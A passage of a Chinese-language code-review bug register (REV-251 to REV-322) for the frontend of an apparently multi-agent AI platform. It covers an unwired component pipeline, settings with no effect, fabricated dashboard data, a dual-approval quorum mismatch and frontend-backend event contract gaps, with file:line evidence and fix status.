- 若干失败对用户是可见的（正面样本，可作为修复模板）：审批失败展示 `决策提交失败：{lastError}`（`ApprovalQueue.tsx:53-55`，含限流提示）；工具被拒/超时/错误内联呈现（`ToolGroup.tsx:270-306`）；缺 API Key 明确引导（`useEventBus.ts:94-97` → `showApiKeyNotice` + `ApiKeyDialog`）。
- `ipc-get-app-paths`（`onboardingIpc.ts:115-130`）确实返回真实 `describePaths()`（含 logDir 与逐目录 `probeWrite`），不是假数据。

---

## 14. Bug 登记表（M11 前端组件族与交互体验）

来源子代理：`M11-Components`（ai-components 组件族 + hooks/services）、`M11-Views`（`Client/src/components/**` 46 tsx + `Client/src/views/**` 14）、`M11-Contract`（前端↔契约层，仍在运行，见 §14.5）。
标注：✅复核 = 主代理已亲自读到该处代码；△子代理 = 仅子代理给出 file:line，**修复前需抽样验证**。

### 14.1 组件族管线与 Hook（REV-251~263）

本切片的核心结构性结论：**ai-components 的「事件驱动动态渲染」管线整条未接线**。以下 7 处在生产代码中 0 引用（仅桶文件/自测引用），任何修复若只改其中一环不会改变用户可见行为：

| 孤岛 | 位置 | 引用情况 |
|---|---|---|
| `useEventBusContext` | `Client/src/ai-components/AIEventBus.tsx:85` | 全仓 0 |
| `Subscribe` | `Client/src/ai-components/Subscribe.tsx:42` | 全仓 0 |
| `matchEventType` | `Client/src/ai-components/Subscribe.tsx:131` | 全仓 0 |
| `registry` / `ComponentRegistry` | `Client/src/ai-components/registry.ts:154` | `getComponent`/`hasComponent` 在 app 内 0 调用 |
| `FamilyErrorBoundary` | `Client/src/ai-components/FamilyErrorBoundary.tsx:33` | 全 app 未用（实际只用 `@/components/ErrorBoundary`） |
| `FallbackUI` | `Client/src/ai-components/FallbackUI.tsx:20` | 仅被上面这个死组件引用 |
| loop/memory/multiagent `registerAll` | `core/loop/index.ts:6`、`memory/index.ts:6`、`multiagent/index.ts:6` | 空实现且从不被触发 |

| REV | 严重 | 维度 | 证据（file:line） | 现象 → 影响 → 修复方向 | 状态 |
|---|---|---|---|---|---|
| REV-251 | Critical | 交互/业务 | `ai-components/core/index.ts:16,22,28`、`harness/index.ts:14`、`registry.ts:59` | 注册时 `component: StreamBuffer/CoTFolder/MessageShell/ToolGroup as any`，而 registry 的解析签名是 `ComponentType<{payload; event?}>`（`registry.ts:59`）→ 一旦被 `Subscribe` 接通，`ToolGroup` 收到 `toolCalls=undefined` 并在其 `:77/:79` 的 `.length` 崩溃，`StreamBuffer` 恒返回 null。`as any` 正是掩盖这层违约的手段 → 建立 event.data→props 适配层并去掉全部 `as any`；若判定管线不落地则整目录删除 | ✅复核 |
| REV-252 | 高 | 业务/容错 | `ChatView.tsx:91`、`App.tsx:5`、`AppLayout.tsx` | `<AIEventBus>` 包裹 ChatView，但后代没有任何 `Subscribe`/`useEventBusContext` 消费者；族级 `FamilyErrorBoundary` 未使用 → 该层容器等同废件，「单族崩溃不影响其他族 + 降级重试」实际不生效，仍是整树白屏 → 接通或删除 | △子代理 |
| REV-253 | 高 | 性能/日志 | `AIEventBus.tsx:53,66,77`、`eventStore.ts:41` | Provider 订阅 `s.events`，每次 `pushEvent`（含逐 token 的 `stream_chunk`）复制整数组并对上限 1000 条全量 `.map`，value 未 memo → 会话内 O(n²) 重渲染，而这些 events 无人消费（REV-014 家族，新位置）→ 删容器或 memo value + 收敛订阅字段 | △子代理 |
| REV-254 | 中 | 交互 | `MessageBubble.tsx:42-48`、`MessageList.tsx:196,214` | props 声明 `onCopy/onRegenerate/onThumbUp/onThumbDown` 但组件只解构 `msg`，调用方也从不传 → 复制/重新生成/点赞反馈全链路丢失（REV-015 家族新证据；与 REV-277 的 `MessageActions` 死文件互为因果）→ 接上或删除未用 props | △子代理 |
| REV-255 | 中 | 体验 | `ToolGroup.tsx:318` | `InlineApproval` 倒计时在渲染期取 `Date.now()`，无 interval → 「剩余 Ns」数字冻结（同目录 `ApprovalCard.tsx:37-46` 有正确实现），用户误判超时窗口 → 复用 1s tick 实现（与 REV-277 同行处置） | △子代理 · ◐已修复(P0-1 2026-10-08)：`InlineApproval` 在 PENDING 期间 1s tick 重算「剩余 Ns」，与 `ApprovalCard` 口径一致；REV-277 的文案项仍留 P2-3 |
| REV-256 | 中 | 业务/限流 | `useDashboardData.ts:23-25`、`useApprovalPolling.ts:9-11` | 独立 `setInterval` 每 5s 调 `systemStore.hydrate`（≈12 次/分），叠加 `useEventBus` 的 3s 节流刷新，正违反代码注释自述的 429 阈值 → 大屏常驻时易触发限流并连带其他请求失败 → 统一引用计数 + 共享节流（与 REV-274 同族） | △子代理 |
| REV-257 | 中 | 日志/交互 | `services/api.ts:18-24`、`serverApi.ts:26-31`、`ipcApi.ts:81-113` | 服务层三套错误约定并存：`ApiError{type}` / `ServerError{code}` / IPC `{ok,error:string}` → 上层文案映射与重试策略无法统一，同类故障在三种入口表现不同 → 归一为单一 Result 错误形 | △子代理 |
| REV-258 | 中 | 交互 | `Subscribe.tsx:61-99`、`registry.ts:107,118,128` | `useEffect` 依赖含自身 setState 的 `pendingTypes/resolved`，cleanup 在每次依赖变化即置 `cancelled=true` → 首个 `getComponent().then` 被取消、类型卡死不再渲染；通配/族推断每次 `new RegExp` 全表扫描 → cleanup 只在卸载时置位（接线前置条件） | △子代理 |
| REV-259 | 中 | 安全 | `ipcApi.ts:39,16,35,77` | `getElectronAPI(): any`、`api.xxx()` 结果直传且不 try/catch（IPC reject → 未捕获 Promise），provider `models?: any[]` 绕过校验 → 桥层任何异常在白屏之外无痕迹（与 REV-15x IPC 面同源）→ 收敛 any、包错误 | △子代理 |
| REV-260 | 低 | 业务 | `directoryPicker.ts:21-30`、`NewTaskSetup.tsx:43`、`WorkDirBar.tsx:43` | `pickDirectory(current)` 形参被忽略 → 两处调用方传入的当前目录不生效，对话框不预选（传而不响应） | △子代理 |
| REV-261 | 低 | 业务/引导 | `onboardingStore.ts:164,526` | `canProceed('routing')` 硬要求 `arbitrationModels>=3`，而 `deriveRouting` 上限为 `min(3, len)` → 可用模型 <3 时该步永远无法通过，引导死锁且无提示 → 放宽门槛或明确提示需添加模型 | △子代理 |
| REV-262 | 低 | 交互 | `eventBusBridge.ts:71-85` | 浏览器/开发态 `send()` 仅 `console.warn` 静默丢弃，降级轮询只探测 Electron 存活、从不投递事件 → 开发模式下发送/停止「点了没反应」+ 永久「生成中…」（Electron 生产不受影响）。**与 REV-16x 前端桥接族合并处理**，此处仅补新行号证据 | △子代理 |
| REV-263 | 低 | 体验/a11y | `MessageList.tsx:305,309`、`CoTFolder.tsx:29` | `aria-live="polite"` 容器包住流式正文，另设 sr-only status → 逐 token 可能对读屏连续播报；`CoTFolder` 折叠按钮缺 `aria-expanded` | △子代理 |

### 14.2 业务视图族（REV-264~277）

| REV | 严重 | 维度 | 证据（file:line） | 现象 → 影响 → 修复方向 | 状态 |
|---|---|---|---|---|---|
| REV-264 | 🔴 Critical | 业务语义/安全治理 | `Client/src/stores/approvalStore.ts:46-65`+`:109-131`；`Src/Services/Governance/approvalIdentity.ts:155,168-171`；`Src/Services/LoopControl/approvalGate.ts:244,265-299,317` | **CRITICAL 双人控制（quorum）在人类操作者下永远无法达成**。后端 `countDistinctRoleMatches`（`approvalGate.ts:265-299`）做的是 role↔identity 二分图匹配，**同一 identity 最多只能满足一个角色**；而 `approvalIdentity.ts:162,171` 把人类自报身份统一重写为 `${role}:${verifiedUserId ?? ownerOf()}`——多角色提交时 identity 恒为同一个 → `matched` 恒 1 < `required` 2 → 审批永久 PENDING 直至超时按默认拒绝。前端 `getApprovalProgress` 却按 **role 去重**计数（`approvalStore.ts:52-58` `satisfied.add(role)`），显示「2/2 已审批」，且 `:109-131` 的 for 循环在 PENDING 时继续补齐角色、按钮重新可用 → 用户看到一个「已全通过却被系统拒绝」的死循环。**已核对**：读取三处实现确认口径不一致（前端 role-set vs 后端 identity-matching）→ 前后端统一为身份口径；UI 在仍缺法定人数时如实显示「等待其他独立身份」；这条与 M09/M08 的「身份可自报」缺陷叠加，属红线优先项 | ✅复核 · ✅已修复(P0-1 2026-10-08)：前后端统一为**身份**口径（`countDistinctRoleMatches` 两侧同源 Kuhn 匹配）；客户端改为一次点击只投一票（`getSubmitRole` 探测仍未被覆盖的角色）；同身份重复投票后端返回 409 并说明原因；未达法定人数时 `quorumBlocked` 随审批回传，UI 如实显示「双人控制 n/N（尚缺：X）」与合法补齐路径。**红线未放宽**：CRITICAL 仍需第二位不同身份（另一账号 / 已注册治理 Agent / 策略白名单） |
| REV-265 | 🔴 高 | 数据真相 | `configStore.ts:152-167`、`Src/Interface/RestApi/configApi.ts:55-67`、`ipcApi.ts:524` | Settings 的 153 个滑杆/开关/下拉只写 localStorage；后端 `/api/configs` 只有 GET（`configApi.ts:55-67`），唯一可写通道 `ipcWriteUserConfig` 全仓 0 生产调用（仅 Onboarding 使用）→ **全部用户设置对运行时零影响**，且用户以为已生效 → 接 `userConfigWriter` 白名单或新增 `PUT /api/configs/:name` | ✅已修复(P0-4 2026-10-09)：接 `userConfigWriter` 白名单并新增 `GET/PUT /api/configs/user` + `GET /api/configs/effective`——写路径过 25 条前缀白名单（5 个精确键 + 20 个段前缀）、候选值**整批**过启动校验器（不过则整批拒绝，避免"界面写成功、下次启动直接崩"），回执 `applied/removed/rejected/invalid/statuses/restartPendingCount` 逐项点名；`ui.*` 五项接到真实消费方（大屏轮询、审批轮询、流式合批、事件缓冲）。三相位真实重启取证见 §16.10。**边界**：`NEVER_WRITABLE` 红线（`server.apiToken`、CRITICAL 审批项、`durable.recovery.*` 等）在**服务端**拒写，面板只做只读展示——"控件必须有消费者"成立的是可写子集，不是 153 项全部 |
| REV-266 | 高 | 数据真相 | `hotReloadStore.ts:137-174`、`views/SystemConfig.tsx:204-219`、`configStore.ts:169-177,213-224` | 「即时/回复后/离开时/需重启」四级生效策略与「N 项待生效」徽标纯本地记账：flush 只回调 `applyEffective`，而 `configStore.ts:213-224` 自注释为「扩展点」→ 无消费者；`restartRequired` 无消解动作；`resetField` 不置 `dirty` → 重置后 UI 显示「已同步」而云端/后端仍留旧值 → 徽标必须绑定真实写通道，否则删除该层文案 | ✅已修复(P0-4 2026-10-09)：徽标改绑真实回执——「待生效 N 项」来自 `GET /api/configs/effective` 的 `restartPending`（逐项 `{path,running,onDisk}`），不再是本地记账；`runningLoaded=false` 时状态为 `unknown`（不猜生效时机）；`resetField` 走删除语义并如实显示"待重启生效"而非"已同步"；`configFieldState.spec.ts` 9 例锁住 dirty 与生效态口径。取证见 §16.10（三相位循环里 `restartPendingCount` 4→0→4→0 的完整轨迹） |
| REV-267 | 高 | 业务语义 | `components/Dashboard/AgentTopologyGraph.tsx:16-23,119,161`、`Src/Core/AgentRuntime/types.ts:11-17` | 前端状态枚举为 `IDLE/WORKING/REVIEWING/BLOCKED/COMPLETED/FAILED`，后端 `AgentStatus` 为 `creating/ready/running/suspended/expelled/destroyed` → 无任何映射层，节点全部落灰、图例 6 态永不出现、标题「N 个工作中」恒 0 → 复用 `AgentMonitor` 已有的 6 态对照表（勿再造一套枚举） | △子代理 |
| REV-268 | 高 | 数据真相 | `views/ArbitrationView.tsx:20-31,100-105`、`services/loopApi.ts:86-94` | 弃用真实接口 `GET /api/loops/arbitration`，改从事件流伪造案件（`caseId = e.eventId`，status 只能推出 filed/reasoning）→「已完成/死锁」计数恒 0、7 步状态机只亮 1-2 步、`:100-105`「正在推理中」永挂、同一案件按事件数重复出卡 → 改接真实案件接口 | △子代理 |
| REV-269 | 高 | 业务语义 | `hooks/useAlerts.ts:26`、`Configs/economyRules.json:3` | `INITIAL_SUPPLY` 前端硬编码 `10000`，配置实际 `1000000`（差 100 倍）→「系统池不足」CRITICAL 告警几乎不可能触发，Dashboard 告警徽标与 `AlertList` 恒显「系统运行正常」；同文件规则 1（Token 异常）仍是空 TODO（`:92-97`）却对外宣称五条规则 → 读配置而非硬编码（与 REV-09x 治理大屏伪造告警同族） | △子代理 |
| REV-270 | 中 | 数据真相 | `components/Dashboard/TokenFlowSankey.tsx:70,81-84`、`Src/Services/TokenEconomy/types.ts:10-21` | 无交易记录时用 `systemPool*0.1` 与固定 60/20/15/5% 比例**伪造流量**且无「估算」标注；12 种 `TransactionType` 只映射 4 种、图例 `.slice(0,5)` 再漏 7 类 → 桑基图进出流量不平，用户据此做的经济决策无依据 → 无数据即显式空态 | △子代理 |
| REV-271 | 中 | 交互逻辑 | `views/LoopDebugger.tsx:12-23,35`、`stores/loopStore.ts:34`、`shared/eventTypes.ts` | 6/10 个分类过滤按钮的 type 前缀（`model/tool/verifier/approval/strategy/context`）不存在于事件 SSOT → 永无命中、`strategy:switch` 恒不匹配、统计区块恒 0；点击 trace 后 `hydrate` 整体覆盖 `events` → 左侧「活跃 Trace」塌成 1 条无法再切换；`:192` 空结果仍显示「加载中…」（永久） | △子代理 |
| REV-272 | 中 | 错误呈现 | `stores/taskStore.ts:37-49`、`views/TaskPanel.tsx:28-29,57` | `submitTask/cancelTask` 不判 `!res.ok`、store 无 error 态，TaskPanel 无条件清空输入 → 提交失败时用户丢文本且零提示；筛选条缺「已取消」而后端 `?status=` 支持 → 补 ok 判定与错误态（铁律 §3.2 同族） | △子代理 |
| REV-273 | 中 | 接线缺失 | `AppLayout.tsx:128-137` | Dashboard / AgentMonitor / TaskPanel / WorkingModes / LoopDebugger / ArbitrationView / TraceReplay / TokenLedger **8 个视图只有路由定义，全仓无任何 `<Link to>`/`navigate` 入口** → 已实现的功能对用户不可达（REV-001 家族新位置；修复时须与 M11-Contract 的「路由可达性」结论合并） | △子代理 |
| REV-274 | 中 | 交互/可观测 | `services/eventBusBridge.ts:51,56,79`、`views/ChatView.tsx:58,74` | `connectBridge` 无条件 `setOnline(true)`，`disconnectBridge` 无调用方 → `OfflineBanner` 恒不显示；浏览器模式 `send()` 静默丢命令而 ChatView 不校验返回 → 发送/停止「点了没反应」+ 永久「生成中…」（与 REV-262 同一条链路，修复时合并为一个工单） | △子代理 |
| REV-275 | 中 | 数据真相 | `components/Layout/MainContainer/FeatureView.tsx:32,42,52` | 「Harness 工程检查」显示 `G0 通过 / G1 通过 / G2 待执行` 为硬编码假状态；MCP、数据中台列表同为静态伪造（同页其余 feature 走真实 API，故更难察觉） | △子代理 |
| REV-276 | 低 | 业务语义/文案 | `components/Chat/workingModeLabels.ts:9-17`、`views/WorkingModes.tsx:35-68`、`ModeShell.tsx:26-30` | 同一模式两套中文：`CONSORTIUM` 未译（直接显示 `'consortium'`）、`LITIGATION`「诉讼模式」vs「司法仲裁」、`REGULATION/ASSEMBLY_LINE/AUDIT/DELEGATION` 四项全不一致——违反该文件自述目的「避免文案漂移」；`demoData.ts:182` 的真实数据判定恒 false，`ModeShell` 只有「演示数据」徽标，注释承诺的「实时数据」分支不存在 | △子代理 |
| REV-277 | 低 | 可访问性 | `ToolGroup.tsx:318`、`LeftPanel/FeatureList.tsx:59-61`、`RightPanel/index.tsx:104-150`、`uiStore.ts:99-100` | `TaskPanel` 取消按钮、`MessageActions`、`TaskList` 归档按钮均 `opacity-0 group-hover` 显示 + 图标无 `aria-label` → 键盘/读屏不可达；内嵌审批角标不分会话、不过滤 `autoApproved`，口径与内嵌卡不一致；右侧 5 个预览 tab 恒「待实现」且 `previewFile` 无写入方 | △子代理 |

### 14.3 「UI 控件 → 后端是否消费」核对表（修复验收清单）

| 控件 | 前端提交路径 | 后端/桥是否读取 | 证据 |
|---|---|---|---|
| Settings 153 项滑杆/开关/下拉 | `configStore.setValue` | ❌ 仅 localStorage | `configApi.ts:55-67` 只有 GET；`ipcWriteUserConfig` 0 生产调用 |
| 生效策略徽标 +「N 项待生效」 | `hotReloadStore.scheduleReload` | ❌ flush 只回调空的扩展点 | `hotReloadStore.ts:137-174`→`configStore.ts:213-224` |
| 工作模式下拉（Composer / NewTaskSetup） | `generate_reply.workingMode` | ❌ 解构后即弃用 | `Src/Interface/IpcBridge/ipcBridge.ts:874,933`（形参 `_workingMode`，REV-010 家族新行号） |
| 附件📎 / 图片🖼 | 无 | ❌ 无 onClick 实现 | `components/Chat/Composer.tsx:115-127` |
| 赞/踩/复制/重新生成 | 无 | ❌ 全文件 0 引用 | `Chat/MessageActions.tsx`；`MessageBubble.tsx:42-45` |
| AgentMonitor 搜索框 + 状态筛选 | 无 | ❌ 后端支持但前端从不传 | `views/AgentMonitor.tsx:28,30` vs `agentApi.ts:34`（`?status=`） |
| LoopDebugger 分类过滤 | 本地 | ❌ 前缀不存在于事件 SSOT | `views/LoopDebugger.tsx:12-23` |
| 审批 批准 / 拒绝 | `POST /api/approvals/:id/decide` | ✅ 消费，但法定人数恒不满足（REV-264） | `approvalGate.ts:244,265-299` |
| TaskPanel 提交 / 取消 | `POST`/`DELETE /api/tasks` | ✅ 消费 | `taskApi.ts:100,121` |
| WorkingModes 7 张可视化 | 无 | ❌ 恒判为演示数据 | `demoData.ts:182` |

### 14.4 已核对为干净的点（M11，勿重复排查）

- 事件类型口径无漂移：`approvalStore.applyEvent` 与 `useEventBus` 使用的 `loop:approval_*` / `EventType.*` 全部取自自动生成的 SSOT（`Client/src/shared/eventTypes.ts`，由 `Scripts/genEventTypes.ts` 产出），不存在手写字符串拼错；`unanimous` 的中间态 PENDING 已正确忽略（`useEventBus.ts:173-188`）。
- 订阅生命周期正确：`useEventBus.ts:57-216` 卸载时 `unsub()`，token/loop 刷新走 3s 尾随节流；StrictMode 双挂载因 `connected` 守卫 + unsub 不产生重复回调或重复 `send`。`useApprovalPolling.ts` 的引用计数实现正确。
- 服务层基线：`serverApi.ts` 的 `ServerResult` 约定、单飞刷新（Authorization）与 `AbortController` 超时规范；无裸 `fetch` 绕过 services（仅 `api.ts`/`serverApi.ts` 内部各一处）。
- 凭据不外泄：`secureStore` 明文不落 localStorage；`a2aSync.ts` 上行有脱敏（`SECRET_PATTERNS`/`SENSITIVE_KEY`），失败即停且不标记、成功才 `markSynced`（幂等成立）。
- 本地配置 UI 自洽：`SystemConfig` 搜索/分组/单项重置/导出 JSON 逻辑正确，`fields.tsx` 控件规范（`role="switch"`+`aria-checked`、min/max 夹紧、`type="button"`）。
- 真实接线样本（可作为其他控件的修复模板）：`ModelProviderPanel`、`NewTaskSetup`、`WorkDirBar` 走真实 IPC 并透出后端拒绝原因（409 工作目录锁定语义在 UI 可见）。
- 会话渲染无串话：`MessageList` 滚动跟随与会话切换重置、`TurnView` 折叠分批、`AgentPreparing` 占位与 FE-015 空停止处理正确；`chatStore.hydrateMessages` 按 sessionId 分桶；`loopStore` 的 `traceId/limit` 与 `loopApi.ts:74-80` 逐字段匹配。

### 14.5 契约视角：`Src/Infra/Contracts`↔`Client/src/types`、事件载荷字段级对账（REV-312~324）

来源子代理：`M11-Contract`。本视角只看「一端存在、另一端不存在」的字段/事件名/类型契约断裂，与 §11~§13 的实现缺陷不重叠；与既有 REV-003/010/016/262/274 重合之处只做交叉引用、不重复立项。

#### 清单 A · 后端发出 → 前端从不消费（数据白流，8 项）

| 事件族 | 后端发出位置 | 前端消费情况 |
|---|---|---|
| `task:received/decomposed/assigned/completed` | `Src/Core/Decision/orchestrator/orchestrator.ts:213,308,341,172` | 仅 `taskStore.ts:52` 前缀命中即整表重拉，payload 字段一个不读 |
| `agent:chat_message` | `Src/Interface/RestApi/chatApi.ts:307` | 无任何分支 |
| `arbitration:*`（8 个） | `Src/Services/Arbitration/tribunal.ts:106,205,236,350` | `ArbitrationView` 只读 REST，不吃事件（与 REV-268 同源） |
| `regulation:rule_updated/broadcast/emergency` | `behaviorCode.ts:219`、`broadcastChannel.ts:110`、`regulatoryAuthority.ts:134` | 零消费 |
| `audit:anomaly_detected/completed/patrol_report` | `anomalyDetector.ts:199`、`resourceAuditBureau.ts:153`、`patrolScheduler.ts:143` | 零消费 |
| `memory:written`、`a2a:*`（10 个） | `globalWorkspace.ts:194`；`a2aBroker.ts:114,386,411,481`、`handoff.ts:203,216`、`alertDisposition.ts:137` | 零分支 |
| `loop:budget_warming/soft/hard`、`loop:context_compressed` | `loopEconomy.ts:131`、`contextCompression.ts:235` | 只被 `startsWith('loop:')` 粗粒度节流吃到，档位/阈值字段丢弃 |
| `agent:iteration_complete.outputText`、`agent:stream_end.reason` | `Src/Interface/IpcBridge/ipcBridge.ts:1096,908` | `useEventBus.ts:85-100,144-160` 不读 |

#### 清单 B · 前端期望 → 后端从不发出（永久空态 / 永久 loading，7 项）

| 前端期望 | 期望位置 | 后端侧 |
|---|---|---|
| `agent:reasoning_chunk` / `agent:reasoning_end` | `Client/src/ai-components/core/index.ts:23,29` | 全库无发出点 |
| `agent:message_start` / `agent:message_end` | `core/index.ts:29` | 无发出点 |
| `agent:tool_call` / `agent:tool_result` | `harness/index.ts:15` | 实际名为 `agent:tool_call_started/...`，精确匹配不命中 |
| `loop:approval_timeout_rejected` | `stores/approvalStore.ts:145` | 枚举有、发出映射表刻意省略（`loopEconomy.ts:115-129` + `dualBudget.ts:132`） |
| `sessions.working_mode` / `sessions.agent_id` | `stores/chatStore.ts:487,490` | 表无此列（`migrations.ts:273-278`） |
| `agents.trustLevel` | `stores/agentStore.ts:12` | DTO 无此字段（仅仓储层 `agentRepository.ts:55`） |
| `/api/loops/events` 重启后可用 | 前端回放路径 | `Src/Services/EventBus/eventBus.ts:25` 纯内存，重启必为空 |

#### 清单 C · 名称/类型不匹配（5 项，修复时逐条以 SSOT 为准）

- `messages.rich.error`：前端为 `{code,message}` 对象，后端只采纳 `string`（→ REV-320）。
- 归档：后端写 `archived_at` 而 `status` 恒 `'active'`，前端类型承诺 `'archived'`。
- `loop:approval_requested`：AgentRuntime 载荷 `{taskId,workerAgentId,reviewId}` vs `toolSafetyGate` 载荷 `{approvalId,toolCallId}`（→ REV-317）。
- `approval_decided.auto`：`toolSafetyGate` 有、`approvalApi` 无，而前端读 `data.auto`。
- `agent:todo_updated`：后端枚举有、前端生成产物缺（→ REV-315）。

#### 发现登记（REV-312~324）

| REV | 严重 | 维度 | 证据（file:line） | 现象 → 影响 → 修复方向 | 状态 |
|---|---|---|---|---|---|
| REV-312 | 🔴 Critical | 形态契约 | `Client/src/services/eventBusBridge.ts:79,82-91`；`ipcBridge.ts:252-271` | 注释宣称「浏览器形态走 HTTP 轮询取事件」，实际轮询只检测 `electronAPI` 是否存在，`send()` 静默丢弃 → 浏览器下 `ChatView.tsx:58` 的 `generate_reply` 永不送达，`beginStream` 之后没有任何 `stream_end` → 气泡永久 loading、审批与计划全瞎。**本条与 REV-003（✅复核，同一链路）为同一工单**，此处仅补「注释与实现相反」这一新证据；亦合并 REV-262 / REV-274 | ✅复核（既有 REV-003 已核） |
| REV-313 | 🔴 Critical | 事件持久化契约 | `Src/Interface/EventStore/aiEventStore.ts:27-30`（`PERSIST_PREFIXES`）；`Client/src/ai-components/harness/ToolGroup.tsx:234`、`hooks/useEventBus.ts:163-171` | `PERSIST_PREFIXES` 为 `agent:/task:/tool:/approval:/memory:/middleware:/hook:/delegation:/arbitration:/token:/chat:` —— **不含 `loop:`**（也不含 `governance:/audit:/regulation:`），而对话内审批事件名为 `loop:approval_*` → 审批卡只能来自 live 事件，重启或切回会话后**内嵌审批卡永久消失**，后端审批仍 PENDING 并阻塞 loop（`/api/approvals` 携 `toolCallId` 可回填却无人关联）→ 前缀补 `loop:` 等族，并在 `hydrateMessages` 后按 toolCallId 重链。**已核对**：`aiEventStore.ts:27-30` 前缀列表确无 `loop:` | ✅复核 · ✅已修复(P0-1 2026-10-08)：`PERSIST_PREFIXES` 补 `loop:`，`loop:approval_*` 携带 `toolCallId` 落库 → 重启/切回会话后内嵌卡按 `toolCallId` 重链。`governance:/audit:/regulation:` 族仍未纳入持久化（属 P1-2 traceId 贯通范围） |
| REV-314 | 高 | 事件风暴/限流 | `Client/src/hooks/useEventBus.ts:68-73`、`Client/src/stores/agentStore.ts:35-39`、`ipcBridge.ts:1052` | 每条消息（含逐 token 的 `agent:stream_chunk`）都调 `agentStore.applyEvent`，其中 `if (type.startsWith('agent:')) hydrate()` → **每 token 发一次 `GET /api/agents`**；FE-012 节流只覆盖 `token:`/`loop:` → 生成期数十~数百 QPS 打满 `apiRateLimiter` → 429 期间审批等写操作失败（用户体验为「点了批准没反应」，与 REV-264 后果叠加）→ 排除高频流式事件并复用节流器。**已核对**：`agentStore.ts:35-39` 与 `useEventBus.ts:68-73` 的实现确为该路径 | ✅复核 · ✅已修复(P0-1 2026-10-08)：`agentStore.applyEvent` 改为 `ROSTER_EVENTS` 白名单（`agent:recruited/ready/expelled/destroyed` + `loop:started/completed/aborted`）才触发，并加 `ROSTER_COALESCE_MS=1000` 尾部合并 → 逐 token 的 `agent:stream_chunk` 不再发请求。429 留痕与 `Retry-After` 可读仍归 P1-5 |
| REV-315 | 高 | SSOT 漂移 | `Src/Services/EventBus/eventTypes.ts:35` ↔ `Client/src/shared/eventTypes.ts:24-27`；`Scripts/genEventTypes.ts` | 后端枚举 83 成员 vs 前端产物 82：**缺 `AGENT_TODO_UPDATED`**；产物还含生成器不会输出的手写注释（`:24`）且 A2A/MEMORY 顺序被打乱 → 证实该「自动生成文件」被手改，且重跑生成器无人验证 → 产物纳入 CI 比对、禁止手改（`todoStore.ts:69` 被迫自造字符串即为此后果）。**已核对**：后端枚举有 `AGENT_TODO_UPDATED`，前端产物 grep 无命中 | ✅复核 |
| REV-316 | 高 | 幻影事件名 | `core/index.ts:23,29`、`harness/index.ts:15` ↔ `Src/Services/EventBus/eventTypes.ts:28-35`；`Subscribe.tsx:131-140` | 注册表登记的 6 个事件名后端从未发出，且 `agent:tool_call` 精确匹配不等于 `agent:tool_call_started` → CoT 折叠 / 消息外壳 / 工具组三族组件即使接通 `Subscribe` 也永不渲染（与 REV-251/252 同一条未接线管线，修复时合并）→ 改用产物常量或模式 `agent:tool_call_*` | △子代理 |
| REV-317 | 高 | payload 分叉 | `Src/Core/AgentRuntime/agentRuntime.ts:31,75-79` ↔ `Src/Services/LoopControl/middleware/toolSafetyGate.ts:318-331`；`useEventBus.ts:163-171`；`approvalApi.ts:43-46` | 同名事件两种载荷：Reviewer 流只带 `reviewId/taskId`，前端要求 `approvalId && toolCallId` 否则丢弃；且 `pendingReviews` 不入 approvalGate 队列、无 REST 查询端点 → **评审类审批 UI 完全不可见**，任务永久 `awaitingApproval` → 统一载荷并暴露查询/决策端点 | △子代理 · ✅已修复(P0-1 2026-10-08)：`submitForReview`/`reviewSubmission` 事件统一为审批形载荷（`approvalId=reviewId`、`requestedBy`、`status`、`decidedBy=reviewer:<agentId>`），`pendingReviews` 打 `owner` 戳；新增 `GET /api/reviews`（`approvalApi.ts` 投影为只读审批行，`decisionPolicy:'reviewer_agent'`），审批栏渲染为「等待 Reviewer Agent 裁决」徽标而非可点按钮。**有意收窄**：不暴露 `POST /api/reviews/:id/decide`——在 P0-2 鉴权中间件落地前，任何写路径都等于再开一条可自报身份的匿名通道；评审落定由后端 Reviewer Agent 驱动 |
| REV-318 | 中 | 字段缺失 | `agentStore.ts:12`、`views/AgentMonitor.tsx:62`、`AgentView.tsx:150` ↔ `Src/Core/AgentRuntime/types.ts:48-67`、`agentApi.ts:17` | `AgentInstance` 无 `trustLevel`（仅 `agentRepository.ts:55` 有，默认 L1），且 `/api/agents` 返回 `unknown[]` 使 TS 无法拦截 → 监控页「信任等级」列恒空白 → DTO 显式投影 | △子代理 |
| REV-319 | 中 | 列缺失 | `chatStore.ts:27-39,487,490` ↔ `Src/Infra/Db/migrations.ts:273-278,297,395,577`；`chatApi.ts:95-107` | `sessions` 无 `working_mode`/`agent_id` 列（迁移只加了 `work_dir`/`owner_user_id`/`archived_at`）→ 会话工作模式永远回落 `'DIRECT'`、agent 归属永远等于 sessionId，`chatApi.ts:95-107` 直出裸行掩盖问题（与 REV-010「workingMode 解构后即弃用」同族，本条是 DB 侧根因）→ 补列或删字段 | ✅已收口(P0-4 2026-10-09，按「删字段」支)：`working_mode` 的幻影读取已删（全仓 grep 无残留），工作方式改为**任务级**属性——`POST /api/tasks` 的 `routingMode` → `TaskRecord.routingMode` → `GET /api/tasks` 回显 → `TaskPanel` 卡片显示；`agent_id` 保留显式 `?? s.session_id` 回落并留 TODO（后端支持 `conversation_id` 后改分组）。**残留**：会话级工作方式若真要持久化仍需补 `sessions` 迁移，本批不做（§16.10 遗留边界③） |
| REV-320 | 中 | 类型不匹配 | `chatStore.ts:114,392` ↔ `chatApi.ts:523` | 前端把 `error` 当 `{code,message}` 对象上送，后端 `typeof === 'string'` 才采纳 → 失败原因永不落库，重启后错误消息看似正常（REV-004 家族：error 态被洗白的另一半成因）→ 统一为 `{code,message}` 或双形兼容 | △子代理 |
| REV-321 | 中 | 死分支事件 | `approvalStore.ts:145` ↔ `loopEconomy.ts:115-129`、`dualBudget.ts:132` | `loop:approval_timeout_rejected` 枚举与前端分支都在，但后端映射表 `if (!eventType) return` 刻意省略该档 → 超时拒绝只能等 30s 轮询（`useApprovalPolling.ts:22`）感知，用户看到审批卡滞留 30 秒 → 接线或删枚举 | △子代理 · ✅已修复(P0-1 2026-10-08)：`approvalGate.ts` 新增 `publishApprovalTimeout()`，定时器与巡检两条超时路径都广播 `loop:approval_timeout_rejected`（载荷含 `approvalId/toolCallId/loopId/reason`）→ 前端立即把内嵌卡切为「审批超时，已默认拒绝」，不再等 30s 轮询 |
| REV-322 | 中 | 头部丢失 | `Client/src/services/api.ts:105,160,181` ↔ `Src/Interface/WebServer/apiRateLimiter.ts:95,101` | 桌面端 `serverFetch` 不回传响应头，前端 `header('Retry-After')` 恒 null → 退避硬编码 5s，忽略后端真实 `retryAfter`（body 里其实有）→ 主进程回传头或直接读 `body.retryAfter`（与 REV-016 家族同源，本条为桥接侧根因） | △子代理 |
